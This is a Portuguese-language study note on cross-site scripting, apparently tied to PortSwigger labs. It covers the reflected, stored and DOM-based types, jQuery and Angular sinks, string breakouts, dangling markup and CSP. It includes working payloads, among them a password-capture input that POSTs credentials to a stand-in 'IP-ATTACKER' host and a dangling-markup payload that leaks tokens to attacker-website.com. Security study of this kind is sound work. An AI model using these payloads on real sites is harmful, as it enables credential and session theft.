#web #vuln 

**Cross Site Scripting** é uma vulnerabilidade que permite manipular um site para retornar um javascript malicioso para o usuário, comprometendo suas interações com o aplicativo.

Existem três tipos de ataque XSS
- [[#Reflected XSS]]
- [[#Stored XSS]]
- [[#DOM-based]]

E elas podem ser usadas para [[#Roubar cookies |roubar senhas]], [[#Roubar cookies |cookies]], e até mesmo em ataques [[CSRF]].
## Reflected XSS

Este é a variação mais simples que é quando o aplicativo recebe o script malicioso e inclui (reflete) ele na resposta.

A maioria dos scripts que são refletidos podem ser encontrados através de scanner. Já manualmente, os testes são:

- Enviar para cada ponto de entrada de dados um conjunto de valores alfanuméricos aleatórios e ver se encontra eles na resposta
- Determine o contexto de reflexão, ou seja, se o input está dentro de aspas, qual tag que ele pertence...
- Testar alguns payloads

## Stored XSS

O XSS persistente é quando o script é armazenado no banco, por exemplo, os comentários de um post que permite o hacker colocar um script no input.

Os testes são os mesmo que o refletido, porém é importante saber onde vai o input inserido, as vezes ele não é inserido na mesma página que você preencheu a entrada. Por exemplo, em um ctf tinha um pedido de suporte que possuia um input de mensagem inseguro e que é mandado para o painel do admin (que eu não tenho acesso) mas descobri de alguma forma que mandavam para lá.

## [[DOM-Based]]

Neste ataque a string maliciosa não é analisado pelo navegador até que o JS do site seja executado. Nas variações anteriores, o script malicioso é inserido na página que ao ser carregada, automaticamente o script será executado. Porém no XSS baseado em DOM, não há script malicioso inserido como parte da página, só o script legítimo da página.

O problema está quando este script legítimo faz uso de uma entrada do usuário e insere na página usando `document.write` de forma insegura.

Lab: [[XSS - DOM XSS in document.write]]
Lab: [[XSS - DOM XSS in document.write inside select element]]

Ou é inserido através do `innerHTML`.

Lab: [[XSS - DOM XSS in innerHTML]]

Existe uma extensão chamada **DOM Invader** para o navegador do Burp que automatiza a busca por DOM-based XSS (so que é paga :c).

### jQuery

Essa variação também pode ser explorada através de bibliotecas em JS como jQuery que possui a função `attr()` que altera atributos de elementos da DOM. Por exemplo, uma função que altera o atributo "href" do elemento de id "backLink", pegando o valor da URL.

```jQuery
$(function() { 
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); 
});
```

O seletor do jQuery `$()` em conjunto com `location.hash` (que auto-scrolla para um elemento) também pode ser alvo de XSS. Embora as versões mais recentes já tenha resolvido este caso em particular, o seletor `$()` ainda por ser um alvo.

Lab: [[XSS - DOM XSS in jQuery selector sink]]

### Angular

Até mesmo algumas versões antigas do Angular são vulneráveis à XSS podendo passar payloads como:

```js
{{$on.constructor('alert(1)')()}}
```

**Paylods**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md

### Combinando DOM-based com reflected e stored

Em uma vulnerabilidade **reflected DOM XSS** o servidor processa dados da aplicação e joga na resposta. Os dados refletidos podem ser colocados em uma string JavaScript literal, ou em um item de dados dentro do DOM, como um campo de formulário. Um script na página processa os dados refletidos de maneira insegura, escrevendo-os para uma sink vulnerável.

```javascript
eval('var data = "reflected string"');
```

Lab: [[XSS - Reflected DOM XSS]]

Já na falha DOM XSS persistente, o server recebe o dado da requisição, armazena e posteriormente inclui o dado na resposta.

### Pontos que podem sem explorados DOM-based XSS

| HTML/JS | jQuery |
| ---- | ---- |
| document.write() <br>document.writeln() <br>document.domain <br>element.innerHTML <br>element.outerHTML <br>element.insertAdjacentHTML <br>element.onevent | add() <br>after() <br>append() <br>animate() <br>insertAfter() <br>insertBefore() <br>before() <br>html() <br>prepend() <br>replaceAll() <br>replaceWith() <br>wrap() <br>wrapInner() <br>wrapAll() <br>has() <br>constructor() <br>init() <br>index() <br>jQuery.parseHTML() <br>$.parseHTML()` |

## Contexto

Ao testar um input é necessário entender o contexto que ele está inserido. É preciso analisar se a string está dentro de uma tag ou se é um atributo, quais tags são bloqueadas, se existe um WAF.

Por exemplo, se a tag é bloqueada, é possível ir no burp intruder e colar todas as tags do [[#Cheat sheet |cheat sheet]] para testar quais tags não estão sendo bloqueadas. O mesmo vale para os atributos que estão sendo bloqueados.

Lab: [[XSS - Reflected XSS with attr blocked]]

Em casos do contexto XSS estar dentro de uma string literal, é possível quebrar.

```js
'-alert(document.domain)-'
';alert(document.domain)//
```

Algumas aplicações para prevenir de escapar de uma string, coloca uma barra invertida antes das aspas. Uma barra invertida antes de um caractere diz ao analisador JavaScript que o caractere deve ser interpretado literalmente, e não como um caractere especial. Nessa situação, os aplicativos muitas vezes cometem o erro de não conseguir escapar do próprio caractere de barra invertida. Isso significa que um invasor pode usar seu próprio caractere de barra invertida para neutralizar a barra invertida adicionada pelo aplicativo.

```js
';alert(document.domain)//
\';alert(document.domain)//
\';alert(document.domain)//
\\';alert(document.domain)//
```

É possível chamar funções sem usar parênteses em casos que o WAF bloqueia elas. Isso é explicado melhor neste [artigo](https://portswigger.net/research/xss-without-parentheses-and-semi-colons).

## Como explorar
### Roubar cookies

Essa é a forma mais tradicional de explorar XSS porém existem algumas limitações que podem te impedir:

- A vítima não estar logada
- A flag `HttpOnly:true`
- Cookies de sessão estar atrelado ao IP do usuário

### Capturar senhas

Para tentar evitar as limitações de roubar os cookies, um outro alvo é usuários que usam preenchimento automático de senhas feita pelos gerenciadores de senhas.

```html
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://IP-ATTACKER',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

## Dangling markup

Esta técnica é para capturar dados *cross-domain* em situações que um ataque comum de XSS não é possível.

Por exemplo, suponha que um input não esteja seguro e que não filtra caracteres como `>` ou `"`. Isso poderia facilmente ser quebrado usando a aspas e fechando com a tag = `">`. Se existir um bloqueio para ataques comuns de XSS um teste para entregar o XSS é com um ataque de injeção de marcação pendurada (dangling markup) usando um payload como:

```html
"><img src='//attacker-website.com?
```

Observe que o atributo `src` não é fechado (dangling). Quando um navegador analisa a resposta, ele aguarda até encontrar uma aspa simples para encerrar o atributo. Assim, tudo até esse caractere será tratado como parte da URL e será enviado para o servidor do invasor dentro da cadeia de caracteres de consulta da URL. Isso pode dar ao invasor dados da requisição como tokens.

Lab: [[XSS - Reflected XSS protected by CSP with dangling markup]]

## Content security policy (CSP)

O CSP é um mecanismo do navegador para mitigar XSS. Ele restringe os recursos, como scripts e imagens, que a página pode carregar e também se uma página pode ser enquadrada por outras páginas com `iframe` por exemplo.

Para saber se a aplicação faz uso deste mecanismo, basta verificar se  a resposta HTTP contém o header `Content-Security-Policy`.

Lab: [[XSS - Reflected XSS protected by CSP with dangling markup]]
Lab: [[XSS - Reflected XSS protected by CSP, with bypass]]

## Cheat sheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
## Referência

https://portswigger.net/web-security/cross-site-scripting
